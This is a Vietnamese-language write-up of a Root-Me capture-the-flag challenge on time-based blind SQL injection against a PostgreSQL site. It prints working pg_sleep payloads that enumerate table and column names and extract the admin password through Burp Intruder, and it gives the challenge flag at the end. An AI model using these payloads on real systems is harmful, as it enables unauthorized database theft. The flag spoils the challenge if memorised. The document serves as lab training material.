# WRITE UP

**Challenge: [SQL Injection -- Time-based](https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-Time-based)**

Về SQLi Time-based, đây là một loại SQLi Blind khi ta sử dụng thời gian res của req để dự đoán thông tin và BurpSuite sẽ hỗ trợ rất tốt về mảng này. Khi ta sử dụng một câu Query đúng, thời gian phản hồi sẽ chậm và ngược lại.

Trong website, ta có một tab là Memberlist, có query như sau:

*http://challenge01.root-me.org/web-serveur/ch40/?action=memberlist&member=**\[x\]***

![Graphical user interface, application, website Description automatically generated](./media/image1.png){width="6.723824365704287in" height="2.3181386701662294in"}

Ở đây, ta có thể lợi dụng để thực hiện tiêm payload vào đằng sau nó và thực hiện blind. Thử blind với payload bằng nhiều version() database khác nhau:

![Graphical user interface, text Description automatically generated](./media/image2.png){width="6.716167979002624in" height="2.7661143919510063in"}

Payload: *3;select+case+when+(0=0)+then+pg_sleep(10)+else+pg_sleep(-1)+end\--*

Payload này sẽ khiến dtb res chậm hơn với pg_sleep() khi query đúng.

-   Server thuộc dạng Postgresql: [pg_sleep() - pgPedia - a PostgreSQL Encyclopedia](https://pgpedia.info/p/pg_sleep.html)

Từ đó, ta sẽ sử dụng Burp Intruder để thực hiện bruteforce table_name, column_name như các bài SQLi đã làm.

1.  **Tìm table_name**

Trước tiên, ta cần tìm kiếm độ dài của table:

Payload: ***3;select+case+when+((select+length(table_name)+from+information_schema.tables+limit+1)=\[length\])+then+pg_sleep(10)+else+pg_sleep(-1)+end---***

Đưa vào Intruder và bruteforce:

![Graphical user interface, application Description automatically generated](./media/image3.png){width="6.5in" height="2.8222222222222224in"}

Ở bảng kết quả, ta filter lại cột "Response Complete". Res nào có độ lớn cao nhất thì chắc hẳn đó là payload đúng.

-   length(table_name) == 5

Đã có table_name, ta tiến hành bruteforce table_name. Bỏ vào intruder:

*member=3;select+case+when+(substr((select+table_name+from+information_schema.tables+limit+1),**§1§**,1)=chr(**§§**))+then+pg_sleep(10)+else+pg_sleep(-1)+end\--*

![Graphical user interface, application Description automatically generated](./media/image4.png){width="6.498615485564304in" height="2.096153762029746in"}

Ghép lại ta được **table_name=users**

2.  **Tìm column_name**

Tương tự như table_name, ta tìm length(column_name) của cột đầu tiên:

![Graphical user interface, application Description automatically generated](./media/image5.png){width="6.499715660542432in" height="2.1666666666666665in"}

Kết quả trả về payload length(column_name) = 2. Ta có thể dự đoán nó có thể là 'id'. Kiểm chứng bằng Repeater:

-   Ký tự 'i':

![Graphical user interface, text Description automatically generated](./media/image6.png){width="6.201306867891514in" height="2.548102580927384in"}

-   Ký tự 'd':

![Graphical user interface, text, email Description automatically generated](./media/image7.png){width="6.5in" height="2.661111111111111in"}

-   Cả 2 response đều tốn 2,285 miliseconds (tương tự thời gian fuzz, khác với response thông thường \~ 200 -- 300 milisecond) column\[0\] == id

Để tìm được column tiếp theo, ta sử dụng offset để filter lại và thực hiện tương tự, bruteforce thôi:

![Graphical user interface, application Description automatically generated](./media/image8.png){width="6.5in" height="2.688888888888889in"}

-   length(column\[2\]) == 8

![Table Description automatically generated](./media/image9.png){width="6.5in" height="2.9604166666666667in"}

-   column_name\[1\] = username

Column\[2\], có length == 9:

![Graphical user interface, text Description automatically generated](./media/image10.png){width="6.5in" height="2.682638888888889in"}

Bruteforce được kết quả column_name\[2\] == firstname:

![Graphical user interface, text, application Description automatically generated](./media/image11.png){width="6.5in" height="3.33125in"}

Tương tự, column\[3\] có length == 8, và dễ dàng đoán được:

-   column_name\[3\] == lastname:

![Graphical user interface, text Description automatically generated](./media/image12.png){width="6.5in" height="2.3243055555555556in"}

![Graphical user interface, text Description automatically generated](./media/image13.png){width="6.5in" height="2.095138888888889in"}

Column\[4\] có length == 5. Suy đoán và thử được kết quả:

-   column_name\[4\] == email

![Graphical user interface, text, email Description automatically generated](./media/image14.png){width="6.5in" height="2.6631944444444446in"}

![Graphical user interface, text Description automatically generated](./media/image15.png){width="6.5in" height="2.3819444444444446in"}

column\[5\] có độ dài ký tự là length == 8:

![Graphical user interface, text Description automatically generated](./media/image16.png){width="6.5in" height="2.415277777777778in"}

Vì length ==8, ta thử kiểm chứng keyword = 'password' thì thấy trùng khớp:

![Graphical user interface, text, application Description automatically generated](./media/image17.png){width="6.5in" height="2.3847222222222224in"}

Như vậy, ta đã tìm được đúng cột password, giờ thì tìm password của admin. Admin có id=1, ta chỉ cần tìm kiếm với offset = 0 là sẽ ra.

![Graphical user interface, application Description automatically generated](./media/image18.png){width="6.5in" height="3.1395833333333334in"}

-   **length(password) == 13**

Sau hơn 1 ngày bruteforce với payload, ta được kết quả:

*member=3;select+case+when+(substr((select+password+from+users+limit+1+offset+0),**§§**,1)=chr(**§§**))+then+pg_sleep(10)+else+pg_sleep(-1)+end\--*

![Graphical user interface, application, table, Excel Description automatically generated](./media/image19.png){width="6.5in" height="3.0625in"}

Ta có được chuỗi ascii password: **84 33 109 51 66 64 115 51 68 83 81 76 33**

Convert to text: **T!m3B@s3DSQL!**

![A screenshot of a computer Description automatically generated](./media/image20.png){width="6.5in" height="3.515972222222222in"}

**Flag:** T!m3B@s3DSQL!
